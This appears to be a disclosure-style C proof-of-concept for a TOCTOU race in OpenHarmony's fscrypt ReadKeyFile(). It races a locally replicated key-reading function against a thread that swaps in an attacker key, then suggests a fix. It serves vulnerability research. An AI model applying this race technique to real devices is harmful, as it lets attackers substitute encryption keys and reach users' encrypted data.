/*
 * PoC: storage_service fscrypt_control ReadKeyFile() TOCTOU
 *      → Encryption Key Substitution
 *
 * Vulnerability: CWE-367 (TOCTOU Race Condition)
 * Component: OpenHarmony storage_service -
 *   services/storage_daemon/libfscrypt/src/fscrypt_control.c:ReadKeyFile()
 *
 * The ReadKeyFile() function:
 *   1. stat(path, &st)         ← validates file size matches expected key len
 *   2. realpath(path, NULL)    ← resolves symlinks to get canonical path
 *   3. open(realPath, O_RDONLY) ← opens the file
 *   4. read(fd, buf, len)      ← reads key material
 *
 * TOCTOU window: Between stat() and realpath(), or between realpath() and
 * open(), the file at `path` can be replaced. Since realpath() resolves the
 * path at call time, and open() resolves again, a symlink swap between these
 * calls means open() may open a different file than stat() measured.
 *
 * More critically: if the `path` itself (not a symlink component) is replaced
 * with a file of the SAME size but DIFFERENT content between stat() and
 * open(realPath), the size check passes but wrong key material is loaded.
 *
 * Impact: An attacker with write access to the key directory can substitute
 * encryption keys, leading to:
 *   - Data encrypted with attacker-controlled keys
 *   - Ability to decrypt user data encrypted with substituted keys
 *   - Denial of service (wrong key → data becomes inaccessible)
 *
 * Attack scenario: A compromised system service or kernel module with
 * access to /data/service/el2/{userId}/crypto/ races key loading during
 * user login, substituting keys to gain access to encrypted user data.
 *
 * Build: gcc -o poc poc.c -lpthread -O2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <limits.h>

#define KEY_DIR "/tmp/poc_fscrypt_keys"
#define KEY_FILE KEY_DIR "/key_desc"
#define FSCRYPT_KEY_DESCRIPTOR_SIZE 8
#define RACE_ITERATIONS 10000

static const uint8_t LEGIT_KEY[FSCRYPT_KEY_DESCRIPTOR_SIZE] =
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22};
static const uint8_t EVIL_KEY[FSCRYPT_KEY_DESCRIPTOR_SIZE] =
    {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};

static volatile int race_won = 0;
static volatile int stop_threads = 0;

/* Exact replication of vulnerable ReadKeyFile from fscrypt_control.c */
static int VulnerableReadKeyFile(const char *path, char *buf, size_t len)
{
    if (!path || !buf) return -1;

    /* Step 1: stat to validate size */
    struct stat st = {0};
    if (stat(path, &st) != 0) {
        return -1;
    }
    if ((size_t)st.st_size != len) {
        return -1;
    }

    /* === RACE WINDOW: file can be replaced here === */

    /* Step 2: realpath to resolve symlinks */
    char *realPath = realpath(path, NULL);
    if (realPath == NULL) {
        return -1;
    }

    /* === RACE WINDOW: realPath target content can change === */

    /* Step 3: open */
    int fd = open(realPath, O_RDONLY);
    free(realPath);
    if (fd < 0) {
        return -1;
    }

    /* Step 4: read key material */
    if (read(fd, buf, len) != (ssize_t)len) {
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

/* Attacker: rapidly swaps key file content */
void *attacker_thread(void *arg)
{
    (void)arg;

    while (!stop_threads) {
        /* Write evil key — same size as legitimate, different content */
        int fd = open(KEY_FILE, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            write(fd, EVIL_KEY, FSCRYPT_KEY_DESCRIPTOR_SIZE);
            close(fd);
        }

        /* Tiny delay */
        for (volatile int i = 0; i < 20; i++);

        /* Restore legitimate key */
        fd = open(KEY_FILE, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            write(fd, LEGIT_KEY, FSCRYPT_KEY_DESCRIPTOR_SIZE);
            close(fd);
        }

        for (volatile int i = 0; i < 20; i++);
    }
    return NULL;
}

/* Victim: simulates storage daemon reading key for fscrypt policy setup */
void *victim_thread(void *arg)
{
    (void)arg;

    for (int i = 0; i < RACE_ITERATIONS && !stop_threads; i++) {
        char keyBuf[FSCRYPT_KEY_DESCRIPTOR_SIZE] = {0};
        int ret = VulnerableReadKeyFile(KEY_FILE, keyBuf, FSCRYPT_KEY_DESCRIPTOR_SIZE);

        if (ret == 0) {
            /* Check if we read the EVIL key instead of legitimate */
            if (memcmp(keyBuf, EVIL_KEY, FSCRYPT_KEY_DESCRIPTOR_SIZE) == 0) {
                printf("[!] RACE WON at iteration %d!\n", i);
                printf("[!] Expected key: ");
                for (int j = 0; j < FSCRYPT_KEY_DESCRIPTOR_SIZE; j++)
                    printf("%02X", LEGIT_KEY[j]);
                printf("\n[!] Got key:      ");
                for (int j = 0; j < FSCRYPT_KEY_DESCRIPTOR_SIZE; j++)
                    printf("%02X", (uint8_t)keyBuf[j]);
                printf("\n");
                race_won = 1;
                stop_threads = 1;
                return NULL;
            }
        }
    }
    return NULL;
}

int main(void)
{
    printf("=== fscrypt ReadKeyFile() TOCTOU PoC ===\n");
    printf("Target: OpenHarmony storage_service libfscrypt/src/fscrypt_control.c\n");
    printf("Bug: stat() validates size, then open()+read() — content can change\n");
    printf("Impact: Encryption key substitution → data encrypted with attacker key\n\n");

    /* Setup key directory and initial legitimate key */
    mkdir(KEY_DIR, 0700);
    int fd = open(KEY_FILE, O_CREAT | O_WRONLY, 0600);
    write(fd, LEGIT_KEY, FSCRYPT_KEY_DESCRIPTOR_SIZE);
    close(fd);

    printf("[*] Key file: %s (%d bytes)\n", KEY_FILE, FSCRYPT_KEY_DESCRIPTOR_SIZE);
    printf("[*] Legitimate key: ");
    for (int i = 0; i < FSCRYPT_KEY_DESCRIPTOR_SIZE; i++)
        printf("%02X", LEGIT_KEY[i]);
    printf("\n[*] Evil key:       ");
    for (int i = 0; i < FSCRYPT_KEY_DESCRIPTOR_SIZE; i++)
        printf("%02X", EVIL_KEY[i]);
    printf("\n\n");

    pthread_t attacker, victim;
    pthread_create(&attacker, NULL, attacker_thread, NULL);
    pthread_create(&victim, NULL, victim_thread, NULL);

    pthread_join(victim, NULL);
    stop_threads = 1;
    pthread_join(attacker, NULL);

    if (race_won) {
        printf("\n[+] PoC SUCCESS: Key substitution via TOCTOU\n");
        printf("[+] Real-world impact:\n");
        printf("[+]   1. Compromised service races storage daemon's key loading\n");
        printf("[+]   2. fscrypt policy is set with attacker's key descriptor\n");
        printf("[+]   3. User data encrypted with attacker-controlled key\n");
        printf("[+]   4. Attacker can later decrypt the data\n");
        printf("\n[+] Fix: Open file first (O_NOFOLLOW), fstat() the fd, then read.\n");
        printf("[+]       Never stat() a path and then open() it separately.\n");
    } else {
        printf("\n[-] Race not won in %d attempts (key swap variant)\n", RACE_ITERATIONS);
        printf("[-] On real device with I/O scheduling, window is wider\n");
    }

    unlink(KEY_FILE);
    rmdir(KEY_DIR);
    return race_won ? 0 : 1;
}
